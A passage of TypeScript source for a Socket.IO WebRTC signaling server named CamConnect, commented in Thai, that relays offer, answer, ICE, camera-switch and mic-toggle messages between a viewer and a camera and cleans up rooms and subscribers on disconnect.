    if (room.members.size === 2) {
      // peer-joined ต้องไปถึง camera (เพราะ camera เป็นคนสร้าง offer)
      // ปกติ: camera join ก่อน (เป็น peer แรก) → ส่งให้ peer แรก = camera ✓
      // FCM wake-up: viewer join ก่อน, camera join ทีหลัง → socket นี้คือ camera
      //   → ต้องส่งให้ตัวเอง (ไม่ใช่ peer แรก = viewer)
      const isCameraSocket = currentDeviceId === roomKey;
      if (isCameraSocket) {
        socket.emit('peer-joined');
      } else {
        socket.to(roomKey).emit('peer-joined');
      }
    }
  });

  socket.on('offer', (payload: unknown) => {
    if (currentRoom) socket.to(currentRoom).emit('offer', payload);
  });

  socket.on('answer', (payload: unknown) => {
    if (currentRoom) socket.to(currentRoom).emit('answer', payload);
  });

  socket.on('ice-candidate', (payload: unknown) => {
    if (currentRoom) socket.to(currentRoom).emit('ice-candidate', payload);
  });

  // viewer ส่งคำสั่งให้กล้องสลับหน้า/หลัง — relay ตรงไปกล้องใน room เดียวกัน
  socket.on('switch-camera', (payload: unknown) => {
    if (currentRoom) socket.to(currentRoom).emit('switch-camera', payload);
  });

  // viewer toggle mic เปิด/ปิด — relay ไปกล้อง
  socket.on('toggle-mic', (payload: unknown) => {
    if (currentRoom) socket.to(currentRoom).emit('toggle-mic', payload);
  });

  socket.on('disconnect', () => {
    // A1: ลบ role tracking
    socketRoles.delete(socket.id);

    if (currentDeviceId) {
      // E2: ลบเฉพาะตอน socketId ตรงกัน (กันลบของ socket อื่นที่ re-register ทับ)
      const cam = cameras.get(currentDeviceId);
      if (cam?.socketId === socket.id) {
        cameras.delete(currentDeviceId);
      }
      console.log(`[disconnect-camera] device=${currentDeviceId.slice(0, 8)}…`);
    }
    // E1: ลบ subscriber + cleanup empty Set entries กัน memory leak
    cleanupSubscribers(statusSubscribers, socket.id);
    cleanupSubscribers(notifSubscribers, socket.id);
    cleanupSubscribers(usageSubscribers, socket.id);
    if (currentRoom) {
      const room = rooms.get(currentRoom);
      if (room) {
        room.members.delete(socket.id);
        socket.to(currentRoom).emit('peer-left');
        if (room.members.size === 0) rooms.delete(currentRoom);
      }
      console.log(`[disconnect] ${socket.id} left room ${currentRoom.slice(0, 8)}…`);
    }
  });
});

httpServer.listen(PORT, () => {
  console.log(`CamConnect signaling server running on :${PORT}`);
});
